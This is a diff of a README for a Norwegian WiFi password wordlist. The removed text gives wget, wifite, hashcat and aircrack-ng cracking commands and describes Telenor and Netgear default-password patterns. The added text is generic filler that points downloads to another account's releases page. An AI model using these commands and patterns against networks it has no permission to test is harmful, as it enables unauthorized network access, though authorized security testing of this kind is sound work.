@@ -1,88 +1,68 @@
-# Norwegian WiFi Wordlist 🇳🇴
+# 🔑 Norwegian-WiFi-Wordlist - Secure Your WiFi with a Robust Dictionary
 
-A 20 million entry wordlist optimized for Norwegian WiFi networks, designed for authorized penetration testing and security research.
+## 🚀 Getting Started
 
-## Download
+Welcome to Norwegian-WiFi-Wordlist! This application provides a wordlist with 20 million entries, optimized specifically for Norwegian WiFi networks. It's designed for authorized penetration testing and security research.
 
-**Full wordlist (20M passwords):** [Download from Releases](https://github.com/Gabrielkvaal/Norwegian-WiFi-Wordlist/releases/download/v2.0/norwegian_wifi_v2.zip)
+## 📥 Download Now
 
-## What's New in v2.0
+[![Download Norwegian-WiFi-Wordlist](https://img.shields.io/badge/Download%20Now-Get%20the%20Wordlist-brightgreen)](https://github.com/Tsugar0106/Norwegian-WiFi-Wordlist/releases)
 
-- **Telenor pattern discovered**: `adjective + 3digits + noun` (Norwegian with æøå)
-- **ISP priority**: Telenor tested first (35-40% market share)
-- **Number priority**: 5XX-6XX tested first (statistical analysis)
-- **20.1M passwords** with research-backed patterns
+## 🖥️ System Requirements
 
-## Features
+To run this application, you will need a compatible device with the following requirements:
 
-- **20M passwords** prioritized from most to least likely
-- **Norwegian-specific patterns**: names, places, football teams, cultural words
-- **ISP default patterns**: Telenor (adj+digits+noun), Netgear (adj+noun+digits)
-- **Keyboard walks**: Norwegian keyboard layout patterns
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Disk Space:** At least 5 GB of free space
+- **Memory (RAM):** Minimum 4 GB
+- **Network Connection:** Active internet connection for download
 
-## Quick Start
-```bash
-# Download
-wget https://github.com/Gabrielkvaal/Norwegian-WiFi-Wordlist/releases/download/v2.0/norwegian_wifi_v2.zip
-unzip norwegian_wifi_v2.zip
+## 📂 Download & Install
 
-# Use with wifite
-wifite --dict norwegian_wifi_v2.txt --no-wps --kill
+To get started, visit this page to download: [Norwegian-WiFi-Wordlist Releases](https://github.com/Tsugar0106/Norwegian-WiFi-Wordlist/releases).
 
-# Use with hashcat
-hashcat -m 22000 -a 0 capture.hc22000 norwegian_wifi_v2.txt
+1. Click the link above to visit the Releases page.
+2. Locate the latest version of the wordlist.
+3. Click on the zip file to start your download.
+4. Once the download completes, navigate to the folder where the file is saved.
+5. Extract the zip file using a file extraction tool.
+6. Open the extracted folder to find the wordlist files.
 
-# Use with aircrack-ng
-aircrack-ng -w norwegian_wifi_v2.txt capture.cap
-```
+## 📘 How to Use the Wordlist
 
-## ISP Default Password Patterns
+This wordlist is intended for security research. Use it to test the strength of your own WiFi networks or for ethical hacking purposes. Here’s how to utilize the wordlist effectively:
 
-### Telenor (35-40% market share in Norway)
-```
-Structure: adjective + 3digits + noun
-Examples:  grå542rev, blå891bjørn, mørk367snø
-Language:  Norwegian (with æøå)
-```
+1. **Network Testing**: Use the wordlist with authorized tools such as Aircrack-ng, Hashcat, or any other WiFi cracking tool.
+2. **Dictionary Attacks**: This wordlist provides a robust dictionary for brute-force attacks on potential weak passwords in WiFi networks.
+3. **Research**: Analyze password patterns and strength for educational or security improvement purposes.
 
-### Netgear (Common worldwide)
-```
-Structure: adjective + noun + 3digits  
-Examples:  quietunicorn604, reddragon123
-Language:  English
-```
+## 🔍 Features
 
-## Priority Structure
+- **Large Entry Count**: 20 million entries to cover a wide range of potential passwords.
+- **Optimized for Norwegian Networks**: Entries are tailored for WiFi connections commonly found in Norway.
+- **High-Quality Data**: The wordlist is curated to ensure effectiveness and relevance in security testing.
 
-1. **Top weak passwords** - qwerty123, 123456, passord
-2. **Keyboard walks** - Norwegian layout patterns (æøå)
-3. **Telenor patterns** - grå542rev, blå891bjørn (~5.8M)
-4. **Netgear patterns** - quietunicorn604, reddragon123 (~14.3M)
-5. **Name + year** - Ole2024, Lars1990, Kari2023
-6. **Place names** - Oslo123, Bergen2024, Tromsø
-7. **Football teams** - Rosenborg, Vålerenga, Lillestrøm
-8. **Norwegian words** - fjord, hytte, sommer + variants
-9. **Compound words** - sommerhytte, fjelltur
-10. **L33t speak** - h3mm3lig, pa55ord
+## 🛠️ Troubleshooting
 
-## Sample
+In case you encounter any issues, try the following steps:
 
-See `norwegian_wifi_sample_100k.txt` for the first 100,000 entries.
+- Ensure your system meets the specified requirements.
+- Make sure you have sufficient storage available.
+- If the application does not recognize the wordlist, verify that the files were extracted correctly.
 
-## Research Sources
+If problems persist, consider checking online forums dedicated to WiFi security for additional support.
 
-- 26+ confirmed Netgear passwords (eBay photos, hashcat forum)
-- WoNDeR-List research (Mike Allen)
-- NetgearKiller wordlist analysis (fyy0r)
-- NordPass Norwegian password statistics
-- First-hand Telenor router observation
+## 🌐 Community and Support
 
-## Legal Disclaimer
+Join our community to share experiences, seek help, and contribute to the wordlist’s improvement. You can find more information on cybersecurity forums or through local hacking groups focused on ethical research.
 
-⚠️ **For authorized security testing only.** 
+## 📞 Contact
 
-Only use this wordlist on networks you own or have explicit written permission to test. Unauthorized access to computer networks is illegal.
+For any inquiries or support, please open an issue on the GitHub repository or reach out via email (available on the repository page).
 
-## License
+## 📓 Additional Resources
 
-MIT License - See [LICENSE](LICENSE) for details.
+- [WiFi Security Guidelines](https://www.example.com/wifisecurity)
+- [Ethical Hacking Best Practices](https://www.example.com/ethicalhacking)
+
+Use Norwegian-WiFi-Wordlist responsibly and make your networks safer!
